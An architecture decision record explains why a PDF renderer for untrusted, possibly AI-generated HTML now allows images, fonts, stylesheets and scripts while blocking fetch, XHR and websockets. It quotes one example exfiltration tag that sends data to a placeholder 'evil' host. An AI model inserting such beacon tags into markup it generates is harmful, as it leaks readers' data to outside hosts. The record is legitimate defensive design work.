# ADR-022 — The PDF is a capture of the viewer, not a stricter rendering of it

**Status:** Accepted
**Date:** 2026-08-06
**Refines:** ADR-007 (every artifact is hostile) for one surface
**Closes:** #147

## Context

`renderPdf` aborts every network request the headless browser makes:

```js
// Kill the network. setContent needs none for an inlined artifact; anything the artifact
// tries to fetch is aborted before it leaves the browser. This is the security property.
await page.setRequestInterception(true);
page.on("request", (req) => { void req.abort().catch(() => {}); });
```

The consequence was reported as "the image didn't render in the PDF download". It is broader than
that. **The viewer's iframe runs remote JavaScript** — that is ADR-007's central claim, and the seed
corpus ships a Chart.js document whose stated purpose is proving it:

> `proves: "CDN JavaScript runs in the sandbox — the ADR-007 proof"`

That document renders a chart in the viewer and exports a PDF with an empty box. So does any
document using a remote image, a webfont, a CDN stylesheet, a CSS `background-image`, or `srcset`.

**Same document, two surfaces, two different outputs, and nothing says why.** That is the defect —
not the missing image, which is a symptom.

### What the render context actually contains

The blanket abort was justified as "the security property", and it is worth being precise about
which property, because the answer turns out to be much less than it sounds:

```js
const pdf = await renderPdf(env.BROWSER, source);   // viewer.ts — `source` and nothing else
```

`renderPdf` receives the artifact's own HTML. `setContent` gives it no origin, so there are no
cookies and no storage belonging to any real site. There is no bearer, no Access JWT, no viewer
identity, no KV handle. It runs in Cloudflare's infrastructure, not on a reader's machine.

So the exfiltration channel a permitted request would open — `<img src="https://evil/?d=…">` —
can carry only what the artifact's author already wrote. That objection is correct and important for
the **viewer**, which runs in a real person's browser with their network position and their session.
It does not transfer to a hermetic, credential-free render.

The risks that survive are ordinary ones: reaching the deployment's own origin, resource
exhaustion, and requests to hosts the operator would not have chosen. Those are addressable by
policy rather than by prohibition.

### Who authors an artifact

Prime directive #4 says every artifact is hostile because "it may come from content the model
didn't control" — prompt injection reaching an LLM that then emits markup. That reasoning stands.
What it argues for is that the artifact must never run **with our authority**, which the sandbox and
the credential-free render both already guarantee. It does not argue that a hermetic render must
also be visually wrong.

## Decision

**The PDF renders what the viewer renders.** Any divergence between the two is a defect.

Request interception stays, but as an allowlist by resource type rather than a blanket abort:

| Allowed | Blocked |
| --- | --- |
| `image`, `font`, `stylesheet`, `script` | `xhr`, `fetch`, `websocket`, `eventsource`, `media`, `manifest`, and everything else |

Plus, on every allowed request:

- **`https:` only.** No `http:`, no `file:`, no `blob:`. `data:` URIs never reach the network.
- **Never the deployment's own host.** The render has no bearer, so it would earn a 401 — but a
  document should not be able to aim the renderer at the API it was published through.
- **A hard request count**, so a runaway document cannot turn one export into a thousand fetches.
- **The existing render timeout** bounds the whole operation.

### Why blocking `fetch`/`xhr`/`websocket` is the line that matters

A script may run and draw a chart. It may not open a channel that carries a reply back. The residual
path — a script constructing an `<img>` — moves only what the artifact already contained, into a
context holding nothing else. That asymmetry is the whole decision: **rendering is permitted,
conversation is not.**

### Why not inline the images in the Worker instead

Considered and rejected. The Worker would fetch each remote image and rewrite it as a `data:` URI,
keeping the browser network-free. It only works for markup we can parse — `<img src>` — so CSS
`background-image`, `srcset`, `<picture>` and webfonts stay broken, which is most of what an
LLM-generated infographic actually uses. Four times the code for partial coverage, and it would
leave the PDF still diverging from the viewer, which is the thing being fixed.

### What was blocked must be reported

The original complaint was silence: a PDF with holes and no explanation. Blocked and failed requests
are collected during the render and surfaced, so an export that could not load something says which
host and why. A limitation that announces itself is a documented behavior; one that does not is a
bug report.

## Consequences

- A document using CDN JavaScript, remote images, webfonts or remote stylesheets exports as it
  appears. The seed's Chart.js document — the ADR-007 proof — stops being a proof the PDF path
  contradicts.
- The comment in `pdf.ts` claiming the browser makes no network requests stops being true, and is
  replaced by the policy above. That invariant was load-bearing in reviews; its replacement has to
  be equally legible.
- The render reaches hosts the operator did not choose, at export time. That is a real change and
  it is the cost of parity with a viewer that already does it.
- Export latency now depends on third-party hosts. The render timeout already bounds this; a slow
  CDN degrades to a missing asset and a note, never a hang.
- ADR-007 is unchanged for the viewer. This narrows its *application* to one surface, where the
  reasoning behind the prohibition does not hold.

## References

- `worker/src/pdf.ts` — `renderPdf`, the interception policy
- `worker/src/viewer.ts` — the iframe sandbox this is now consistent with
- ADR-007 — every artifact is hostile; the sandbox reasoning this refines
- #147 — reported as a missing image, diagnosed as viewer/PDF divergence
- Found exporting "2027 Platform Roadmap" during the 0.28.0 lifecycle run.
